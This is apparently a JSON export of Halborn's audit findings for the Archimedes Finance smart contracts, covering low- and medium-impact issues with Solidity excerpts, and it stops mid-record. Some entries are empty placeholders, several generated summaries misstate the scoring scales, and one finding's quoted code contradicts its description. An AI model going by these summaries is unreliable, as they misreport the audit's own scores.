{
  "category": "Indexes",
  "total_findings": 668,
  "fetched_at": "2026-01-29T13:41:28Z",
  "findings": [
    {
      "id": "50620",
      "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
      "impact": "LOW",
      "content": "##### Description\n\nIn public functions, array arguments are immediately copied to memory, while external functions can read directly from `calldata`. Reading `calldata` is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function.\n\nCode Location\n-------------\n\nConsider marking below functions as external instead of public if they will never be directly called within the same contract or in any of their descendants:\n\n\\textbf{\\underline{AccessController.sol}:}\naddMinter, revokeAdmin, getAddressGovernor, getAddressGuardian\n\n\\textbf{\\underline{ParameterStore.sol}:}\ngetTreasuryAddress, getCurveGuardPercentage, getSlippage, getArchToLevRatio, getAllowedLeverageForPositionWithArch, calculateOriginationFee, calculateArchNeededForLeverage\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50619",
      "title": "UNUSED FUNCTIONS",
      "impact": "LOW",
      "content": "##### Description\n\nSome unused functions have been declared in `Exchanger.sol` contract. Although they are declared as `external`, they are also declared with the 'OnlyExecutive`modifier, which restricts the usage of these functions only to the address having`Executive`role, which can only be assigned to one address at a time, and it is supposed to be`Coordinator.sol` contract.\n\nHowever, no calls to these functions have been detected in `Coordinator.sol`, making these functions useless.\n\nCode Location\n-------------\n\n#### PoolManager.sol\n\n```\nfunction xLvUSDfor3CRV(uint256 amountLvUSD) external nonReentrant onlyExecutive returns (uint256) {\n        return _xLvUSDfor3CRV(amountLvUSD);\n    }\n\n    function x3CRVforOUSD(uint256 amount3CRV) external nonReentrant onlyExecutive returns (uint256) {\n        return _x3CRVforOUSD(amount3CRV);\n    }\n\n    function xOUSDfor3CRV(uint256 amountOUSD) external nonReentrant onlyExecutive returns (uint256) {\n        return _xOUSDfor3CRV(amountOUSD);\n    }\n\n    function x3CRVforLvUSD(uint256 amount3CRV) external nonReentrant onlyExecutive returns (uint256) {\n        return _x3CRVforLvUSD(amount3CRV);\n    }\n\n```\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50618",
      "title": "HARDCODED SLIPPAGE",
      "impact": "LOW",
      "content": "##### Description\n\nIn most of the interactions with pools (such as swaps or liquidity providings), slippage % is somehow adjustable (since `_slippage` parameter from `ParameterStore.sol` contract is used).\n\nHowever, in some interactions, such as when providing liquidity using `PoolManager.sol`'s `fundPoolWith3CRV()`, slippage % is hardcoded, and used as `_min_mint_amount`value.\n\nCode Location\n-------------\n\n#### PoolManager.sol\n\n```\n    function fundPoolWith3CRV(address buyerAddress, uint256 amoutToFundInLvUSD) external nonReentrant onlyAdmin returns (uint256) {\n        /// Method assumes that this contract , has allowance to spend buyerAddress 3CRV tokens\n        /// Method assumes that this contract, has allowance to spend Coordinator lvUSD tokens\n        require(_lvusd.balanceOf(_addressCoordinator) > amoutToFundInLvUSD, \"Insufficient lvUSD on Coord\");\n        // // Transfer lvUSD and 3CRV to this contract\n        _lvusd.safeTransferFrom(_addressCoordinator, address(this), amoutToFundInLvUSD);\n        _crv3.safeTransferFrom(buyerAddress, address(this), amoutToFundInLvUSD);\n        uint256[2] memory amounts = [amoutToFundInLvUSD, amoutToFundInLvUSD];\n        uint256 expectedTokenAmountToGet = (_poolLvUSD3CRV.calc_token_amount(amounts, true) * 99) / 100;\n        return _poolLvUSD3CRV.add_liquidity(amounts, expectedTokenAmountToGet, buyerAddress);\n    }\n\n```\n\n#### Exchanger.sol\n\n```\nfunction _swapOUSDforLvUSD(uint256 amountOUSD, uint256 minRequiredLvUSD) internal returns (uint256 lvUSDReturned, uint256 remainingOUSD) {\n        // Estimate \"neededOUSD\" using get_dy()\n        uint256 _needed3CRV = _poolLvUSD3CRV.get_dy(_indexLvUSD, _index3CRV, minRequiredLvUSD);\n        uint256 _neededOUSD = _poolOUSD3CRV.get_dy(_index3CRV, _indexOUSD, _needed3CRV);\n        uint256 _neededOUSDWithSlippage = (_neededOUSD * 101) / 100;\n\n        require(amountOUSD >= _neededOUSDWithSlippage, \"Not enough OUSD for exchange\");\n\n        // We lose some $ from fees and slippage\n        // multiply _neededOUSD * 103%\n        uint256 _returned3CRV = _xOUSDfor3CRV(_neededOUSDWithSlippage);\n\n        uint256 _returnedLvUSD = _x3CRVforLvUSD(_returned3CRV);\n        require(_returnedLvUSD >= minRequiredLvUSD, \"Not enough LvUSD in pool\");\n\n        // calculate remaining OUSD\n        remainingOUSD = amountOUSD - _neededOUSDWithSlippage;\n        _ousd.safeTransfer(_addressCoordinator, remainingOUSD);\n\n        // send all swapped lvUSD to coordinator\n        _lvusd.safeTransfer(_addressCoordinator, _returnedLvUSD);\n\n        return (_returnedLvUSD, remainingOUSD);\n    }\n\n```\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50617",
      "title": "UNUSED RETURN",
      "impact": "LOW",
      "content": "##### Description\n\nAs described in finding `CONTRACT DEPENDENCIES CANNOT BE MODIFIED`, when `setDependencies()` function from `PoolManager.sol` is called, also two `approve()` calls of `LvUSD` and `3CRV` are performed. However, unlike the rest of the contracts, `approve()` is used, instead of `safeApprove()`, `safeIncreaseAllowance()`, or `safeDecreaseAllowance()`.\n\nAs also described in `UNCHECKED TRANSFER` finding, checking the return value of these kind of transfers is considered a good practice, and could prevent contract malfunctions in case of approval failures if non revert on fail tokens are in use.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50616",
      "title": "UNCHECKED TRANSFER",
      "impact": "LOW",
      "content": "##### Description\n\nSeveral tokens do not revert in case of failure and return false. If that happened, Treasury would not receive the burned `ARCH` and any user could open positions without having to pay any `ARCH`.\n\nAlthough `ARCH` token implementation currently reverts on failure, it is still considered a best practice to check the return value of any external token interaction.\nThis is being currently done for every interaction with external tokens (such as `LvUSD`, `3CRV`, or `OUSD`) by using `SafeERC20Upgradeable`, but not with `ARCH`. This may lead to contract malfunctions if `ARCH` implementation changes in a future or during the development phase.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50615",
      "title": "FEE-ON-TRANSFER TOKENS NOT SUPPORTED",
      "impact": "LOW",
      "content": "##### Description\n\nCertain ERC20 tokens may modify token balances or amounts used in `transfer()`, `transferFrom()`, and `balanceOf()` calls. One of these tokens are deflationary tokens, that charge a certain fee for every `transfer()`` or`transferFrom()``. During the code review, it has been detected that the protocol does not support Fee-on-transfer tokens, due mainly to the incompatibilities and balance mismatches that would cause every transaction to revert.\n\nCode Location\n-------------\n\nMultiple of these mismatches have been already commented on findings above, such as `POSITIONS CANNOT BE UNWOUND DUE TO OUSD BEHAVIOR` finding.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50614",
      "title": "UNINITIALIZED CONTRACTS",
      "impact": "LOW",
      "content": "##### Description\n\nAlthough set in place, contracts such as `ReentrancyGuardUpgradeable`, `UUPSUpgradeable`, and `AccessControlUpgradeable` are not initialized in any of the smart contracts in which they are being used.\n\nAlthough the current implementation allows these contracts to properly function without being initialized, future upgrades might not behave the same way, creating new vulnerabilities or even rendering the contract unusable.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50613",
      "title": "VAULTS NEED TO ENABLE OUSD REBASES",
      "impact": "LOW",
      "content": "##### Description\n\nBy default, any EOA holding any `OUSD` balance will be automatically enrolled in the token's rebase feature, meaning that their balance will be increased whenever the token is rebased without having to perform any additional action.\n\nHowever, this is not true for any multi-sig wallet or any other kind of smart contract, needing to enroll manually by calling `OUSD`'s `rebaseOptIn()` function. Otherwise, no `OUSD` yield will be earned.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50612",
      "title": "UNUSED IMPORTS",
      "impact": "LOW",
      "content": "##### Description\n\nMany contracts in scope imports `console.sol` contract but none of its functions are used anywhere, with the exception of `Exchanger.sol`.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50611",
      "title": "UNDEPLOYABLE CONTRACTS",
      "impact": "LOW",
      "content": "##### Description\n\nMultiple contracts on scope exceed `24576 bytes` contract size limit, and could not be effectively deployed on the mainnet.\n\nCode Location\n-------------\n\n* VaultOUSD.sol: 26656 bytes\n* Exchanger.sol: 25194 bytes\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50610",
      "title": "USE ++I INSTEAD OF I++ IN LOOPS FOR GAS OPTIMIZATION",
      "impact": "LOW",
      "content": "##### Description\n\nIn the loop within getAllowedLeverageForPosition() function in `ParameterStore.sol` contract, the variable `i` is incremented using `i++`. It is known that, in loops, using `++i` costs less gas per iteration than `i++`. This also affects variables incremented inside the loop code block.\n\nCode Location\n-------------\n\n#### ParameterStore.sol\n\n```\n    function getAllowedLeverageForPosition(uint256 principle, uint256 numberOfCycles) public view returns (uint256) {\n        require(numberOfCycles <= _maxNumberOfCycles, \"Cycles greater than max allowed\");\n        uint256 leverageAmount = 0;\n        uint256 cyclePrinciple = principle;\n        for (uint256 i = 0; i < numberOfCycles; i++) {\n            cyclePrinciple = (cyclePrinciple * _globalCollateralRate) / 100;\n            leverageAmount += cyclePrinciple;\n        }\n        return leverageAmount;\n    }\n\n```\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50609",
      "title": "FEE RATES DIFFERS FROM WHITEPAPER",
      "impact": "LOW",
      "content": "##### Description\n\nFinding description placeholder\n\n##### Score\n\nImpact:   \nLikelihood:",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50608",
      "title": "MISLEADING CODE COMMENTS",
      "impact": "LOW",
      "content": "##### Description\n\nWhile comments are useful for understanding true purpose and functionality of the code, misleading comments have been detected that do not match with the actual implementation in the code.\n\nCode Location\n-------------\n\nIn this instance, comments describe a `3%` slippage and fee overrun, but it is previously fixed at `1%`.\n\n#### Exchanger.sol\n\n```\n    function _swapOUSDforLvUSD(uint256 amountOUSD, uint256 minRequiredLvUSD) internal returns (uint256 lvUSDReturned, uint256 remainingOUSD) {\n        // Estimate \"neededOUSD\" using get_dy()\n        uint256 _needed3CRV = _poolLvUSD3CRV.get_dy(_indexLvUSD, _index3CRV, minRequiredLvUSD);\n        uint256 _neededOUSD = _poolOUSD3CRV.get_dy(_index3CRV, _indexOUSD, _needed3CRV);\n        uint256 _neededOUSDWithSlippage = (_neededOUSD * 101) / 100;\n\n        require(amountOUSD >= _neededOUSDWithSlippage, \"Not enough OUSD for exchange\");\n\n        // We lose some $ from fees and slippage\n        // multiply _neededOUSD * 103%\n        uint256 _returned3CRV = _xOUSDfor3CRV(_neededOUSDWithSlippage);\n\n        uint256 _returnedLvUSD = _x3CRVforLvUSD(_returned3CRV);\n        require(_returnedLvUSD >= minRequiredLvUSD, \"Not enough LvUSD in pool\");\n\n        // calculate remaining OUSD\n        remainingOUSD = amountOUSD - _neededOUSDWithSlippage;\n        _ousd.safeTransfer(_addressCoordinator, remainingOUSD);\n\n        // send all swapped lvUSD to coordinator\n        _lvusd.safeTransfer(_addressCoordinator, _returnedLvUSD);\n\n        return (_returnedLvUSD, remainingOUSD);\n    }\n\n```\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50607",
      "title": "REDUNDANT STATEMENTS",
      "impact": "LOW",
      "content": "##### Description\n\nRedundant statements have been found through the code. These statements increase gas costs for contract deploying and interactions, impact code readability.\n\nCode Location\n-------------\n\nIn this example, `_treasuryAddress` is declared twice but no actual value is assigned:\n\n#### ParameterStore.sol\n\n```\n    address internal _treasuryAddress;\n    uint256 internal _curveGuardPercentage; // in regular (0-100) percentages\n    uint256 internal _slippage; // in regular (0-100) percentages\n    /// example for _archToLevRatio: If each arch is worth 1000 lvUSD, set this to 1000\n    uint256 internal _archToLevRatio;\n    // maximum allowed \"extra\" tokens when exchanging\n    uint256 internal _curveMaxExchangeGuard;\n\n    event ParameterChange(string indexed _name, uint256 _newValue, uint256 _oldValue);\n    event TreasuryChange(address indexed _newValue, address indexed _oldValue);\n\n    function initialize() public initializer {\n        _grantRole(ADMIN_ROLE, _msgSender());\n        setGovernor(_msgSender());\n        setExecutive(_msgSender());\n        setGuardian(_msgSender());\n\n        _maxNumberOfCycles = 10;\n        _originationFeeRate = 5 ether / 100;\n        _globalCollateralRate = 90;\n        _rebaseFeeRate = 10 ether / 100; // meaning 10%\n        _treasuryAddress;\n        _curveGuardPercentage = 90;\n        _slippage = 2; // 2%;\n        _archToLevRatio = 1 ether; // meaning 1 arch is equal 1 lvUSD\n        _curveMaxExchangeGuard = 50; // meaning we allow exchange with get 50% more then we expected\n        _treasuryAddress = address(0);\n    }\n\n```\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50606",
      "title": "UNUSED CODE",
      "impact": "LOW",
      "content": "##### Description\n\nUnused pieces of code such as modifiers or variables have been found through the code. These unused variables increase gas costs for contract deploying and interactions, impact code readability and might cause the contract to behave in unexpected ways or introduce new vulnerabilities if these variables are mistakenly used.\n\nCode Location\n-------------\n\n#### LeverageEngine.sol\n\n```\n    uint256 internal _positionId;\n\n```\n\nThis variable is not used anywhere in the code.\n\n#### CDPosition.sol\n\n```\n    struct CDP {\n        uint256 oUSDPrinciple; // Amount of OUSD originally deposited by user\n        uint256 oUSDInterestEarned; // Total interest earned (and rebased) so far\n        uint256 oUSDTotal; // Principle + OUSD acquired from selling borrowed lvUSD + Interest earned\n        uint256 lvUSDBorrowed; // Total lvUSD borrowed under this position\n        uint256 shares; // Total vault shares allocated to this position\n    }\n\n```\n\n`oUSDInterestEarned` is declared within CDP struct, but it is not used anywhere in the code.\n\n```\n    modifier notImplementedYet() {\n        revert(\"Method not implemented yet\");\n        _;\n    }\n\n```\n\nThis modifier is not used anywhere.\n\n##### Score\n\nImpact: 1  \nLikelihood: 1",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50605",
      "title": "POSITIONS CANNOT BE UNWOUND WHEN TRANSFERRED",
      "impact": "LOW",
      "content": "##### Description\n\nOnce any user opens a position, an NFT containing the relative information gets minted to the user. This NFT grants the position ownership and can be burned (if the position is withdrawn) or sold for a profit.\n\nWhen the NFT is minted using `safeMint()`, `_setApprovalForAll()` also gets called, approving the address with `EXECUTIVE` role in the NFT contract (ideally `LeverageEngine` contract) to burn or transfer the NFT (needed for burning the NFT once the position gets unwound).\n\nHowever, it has been detected that, although these NFTs can be easily transferred by calling `PositionToken.transferFrom()`, the `LeverageEngine` contract will not be approved to interact with the NFT anymore since the owner is different.\n\nThis causes the position to remain locked until one of the two following conditions is met:\n\n* A new approval to `LeverageEngine` gets issued by the new owner.\n* The new owner opens another position, called `_setApprovalForAll()`, approving `LeverageEngine` to interact with every NFT owned by the new user.\n\n##### Score\n\nImpact: 1  \nLikelihood: 2",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50604",
      "title": "UNPROTECTED GLOBALCOLLATERALRATE PARAMETER",
      "impact": "LOW",
      "content": "##### Description\n\nFinding description placeholder\n\n##### Score\n\nImpact:   \nLikelihood:",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50603",
      "title": "LACK OF PARAMETER LIMITS",
      "impact": "MEDIUM",
      "content": "##### Description\n\nIt has been detected that some parameter-modifying functions do not have logical limits. This may cause the contract to function with parameter values that, although allowed, make no sense in the application context, which might cause various problems or even render the contract unusable.\n\nCode Location\n-------------\n\n#### ParameterStore.sol\n\n```\n    function changeOriginationFeeRate(uint256 newFeeRate) external onlyGovernor {\n        emit ParameterChange(\"originationFeeRate\", newFeeRate, _originationFeeRate);\n        _originationFeeRate = newFeeRate;\n    }\n\n```\n\nThis function's lack of logical limits allows the fee charged on every opened position to be set at any % desired. So, for example, setting it to `0` will mean that no fee is charged on every position opened while setting it to `1 ether` will mean that `100%` of the `OUSD` swapped for the borrowed `LvUSD` will be transferred to the treasury, making the position unwindable since the principle deposited will never be enough to pay for the borrowed `LvUSD` (unless the position is opened for only `1 cycle`).\n\nGreater values will stop the position opening functionality since it will try to transfer more `OUSD` to the treasury in the concept of fees than the `OUSD` amount available.\n\n#### Coordinator.sol\n\n```\n    function _takeOriginationFee(uint256 _leveragedOUSDAmount) internal returns (uint256 fee) {\n        uint256 _fee = _paramStore.calculateOriginationFee(_leveragedOUSDAmount);\n        _ousd.safeTransfer(_paramStore.getTreasuryAddress(), _fee);\n        return _fee;\n    }\n\n```\n\nIn addition, `changeMaxNumberOfCycles()`, `changeArchToLevRatio()`, and `changeCurveMaxExchangeGuard()` also lack from parameter limits.\n\n##### Score\n\nImpact: 4  \nLikelihood: 2",
      "summary": "\nThis bug report discusses an issue with some functions in the code that do not have logical limits. This means that the values for certain parameters can be set to any number, even if it doesn't make sense for the application. This can cause problems and may even make the code unusable. The affected functions can be found in the ParameterStore.sol and Coordinator.sol files. This bug has a high impact and a moderate likelihood of occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50602",
      "title": "LACK OF TRANSFEROWNERSHIP PATTERN",
      "impact": "LOW",
      "content": "##### Description\n\nFinding description placeholder\n\n##### Score\n\nImpact:   \nLikelihood:",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50601",
      "title": "LACK OF PARAMETER PRECISION",
      "impact": "MEDIUM",
      "content": "##### Description\n\nIt has been detected that some parameters used in the different contracts are set and used in a way that lets the minimum settable value at 1%.\n\nCode Location\n-------------\n\n#### ParameterStore.sol\n\n```\n        _maxNumberOfCycles = 10;\n        _originationFeeRate = 5 ether / 100;\n        _globalCollateralRate = 90;\n        _rebaseFeeRate = 10 ether / 100; // meaning 10%\n        _treasuryAddress;\n        _curveGuardPercentage = 90;\n        _slippage = 2; // 2%;\n        _archToLevRatio = 1 ether; // meaning 1 arch is equal 1 lvUSD\n        _curveMaxExchangeGuard = 50; // meaning we allow exchange with get 50% more then we expected\n        _treasuryAddress = address(0);\n\n```\n\nFor example, `_slippage` is set to `2`, implying that a maximum slippage of 2% is allowed. However, if this value needs to be modified in the future or if user-controlled slippage is implemented, it would only accept integer values, such as `0%`, `1%`, `2%`, etc.\n\n##### Score\n\nImpact: 2  \nLikelihood: 5",
      "summary": "\nThis bug report discusses an issue with some parameters in a set of contracts. These parameters have been set in a way that only allows for a minimum value of 1% to be used. However, this could cause problems in the future if the value needs to be changed or if users need to control the value. It is recommended to fix this issue to avoid any potential impact, with a likelihood of 5 out of 10.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50600",
      "title": "LACK OF PAUSE FUNCTIONALITY",
      "impact": "MEDIUM",
      "content": "##### Description\n\nIt has been observed that no pausing mechanism is implemented across the contracts. However, pausing mechanisms can be helpful in various situations, such as preventing users from interacting with specific functions under certain conditions (such as a contract upgrade or migration) or as a way to avoid fund loss to attackers in the eventuality of a security breach.\n\n##### Score\n\nImpact: 4  \nLikelihood: 2",
      "summary": "\nThis bug report is about the absence of a pausing mechanism in the contracts. A pausing mechanism is a feature that can prevent users from accessing certain functions in the contracts in specific situations, such as during a contract upgrade or in case of a security breach. The impact of this bug is rated as 4 out of 5, and the likelihood of it occurring is rated as 2 out of 5.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50599",
      "title": "OWNER CAN RENOUNCE OWNERSHIP",
      "impact": "MEDIUM",
      "content": "##### Description\n\nThe `Owner` of the contract is usually the account that deploys the contract. As a result, the `Owner` can perform some privileged functions (such as adding minters or set pools). In every smart contract in scope, ownership renounce functions can be used to renounce the `Owner` or `ADMIN` permission/role. Renouncing ownership before transferring would result in the contract having no `Owner`, eliminating the ability to call privileged functions.\n\nIf `renounceOwnership()` is called in `ArchToken.sol`, the ownership of the contract will be transferred to the zero address, rendering the functions containing the `onlyOwner` modifier unusable:\n\n![ownershipRenounce.png](https://halbornmainframe.com/proxy/audits/images/659e93d2a1aa3698c0ea95db)\n\nSimilar operations could be performed with `revokeRole()` or `renounceRole()` in `LvUSDToken.sol`, or with `revokeAdmin()` on any other contract in scope.\n\n##### Score\n\nImpact: 4  \nLikelihood: 2",
      "summary": "\nThis bug report discusses an issue with the `Owner` role in a smart contract. The `Owner` is the account that deploys the contract and has special privileges, such as adding minters or setting pools. However, if the `renounceOwnership()` function is called in a specific contract, the ownership will be transferred to the zero address, making it impossible to use certain functions. This can also occur with other functions in different contracts. The impact of this bug is rated as 4 out of 10 and the likelihood is 2 out of 10.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
      "protocol_name": "Archimedes Finance",
      "source_link": "https://www.halborn.com/audits/archimedes/archimedes-finance-smart-contract-security-assessment",
      "github_link": "",
      "tags": [],
      "finders": [
        "Halborn"
      ]
    },
    {
      "id": "50598",
      "title": "MISLEADING REVERT MESSAGES",
      "impact": "MEDIUM",
      "content": "##### Description\n\nWhen a `require` condition is not satisfied, an error message is usually included in the response, giving information about the reason for the revert.\n\nHowever, it has been detected that some of the error messages displayed when certain conditions are not met provide an incorrect explanation for the revert. These inaccurate messages could hinder the identification of the cause of the errors to contract administrators and could lead to contract malfunctions if managing decisions are taken after these error messages.\n\nCode Location\n-------------\n\nFour different functions have been implemented for exchanging `LvUSD`, `OUSD`, and `3CRV` pools between Curve pools. However, the error message `LvUSD pool too imbalanced.` is displayed on `_xLvUSDfor3CRV`, `_x3CRVforLvUSD`, and `_x3CRVforOUSD`, but `OUSD pool too imbalanced.` should be displayed instead in the last function.\n\n#### Exchanger.sol\n\n```\nfunction _xOUSDfor3CRV(uint256 amountOUSD) internal returns (uint256 amount3CRV) {\n        /**\n         * @param _expected3CRV uses get_dy() to estimate amount the exchange will give us\n         * @param _minimum3CRV minimum accounting for slippage. (_expected3CRV * slippage)\n         * @param _returned3CRV amount we actually get from the pool\n         * @param _guard3CRV sanity check to protect user\n         */\n        uint256 _expected3CRV;\n        uint256 _minimum3CRV;\n        uint256 _returned3CRV;\n        uint256 _guard3CRV = (amountOUSD * _paramStore.getCurveGuardPercentage()) / 100;\n\n        // Verify Exchanger has enough OUSD to use\n        require(amountOUSD <= _ousd.balanceOf(address(this)), \"Insufficient OUSD in Exchanger.\");\n\n        // Estimate expected amount of 3CRV\n        // get_dy(indexCoinSend, indexCoinRec, amount)\n        _expected3CRV = _poolOUSD3CRV.get_dy(0, 1, amountOUSD);\n\n        // Set minimum required accounting for slippage\n        _minimum3CRV = (_expected3CRV * (100 - _paramStore.getSlippage())) / 100;\n\n        // Make sure pool isn't too bent\n        // TODO allow user to override this protection\n        // TODO auto balance if pool is bent\n        require(_minimum3CRV >= _guard3CRV, \"OUSD pool too imbalanced.\");\n\n        // Increase allowance\n        _ousd.safeIncreaseAllowance(address(_poolOUSD3CRV), amountOUSD);\n\n        // Exchange OUSD for 3CRV:\n        _returned3CRV = _poolOUSD3CRV.exchange(0, 1, amountOUSD, _minimum3CRV);\n\n        // Set approval to zero for safety\n        _ousd.safeApprove(address(_poolOUSD3CRV), 0);\n\n        return _returned3CRV;\n    }\n\n```\n\n##### Score\n\nImpact: 4  \nLikelihood: 2",
      "summary": "\nThis report discusses a bug that has been found in a code that exchanges different types of currency. The bug causes an incorrect error message to be displayed when certain conditions are not met, which could lead to problems for contract administrators and cause the contract to malfunction. The bug is located in four different functions that exchange `LvUSD`, `OUSD`, and `3CRV` pools, and the error message displayed should be `OUSD pool too imbalanced.` instead of `LvUSD pool too imbalanced.` in the last function. The impact of this bug is rated as 4 out of 5 and the likelihood of it occurring is rated as 2 out of 5.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Halborn",
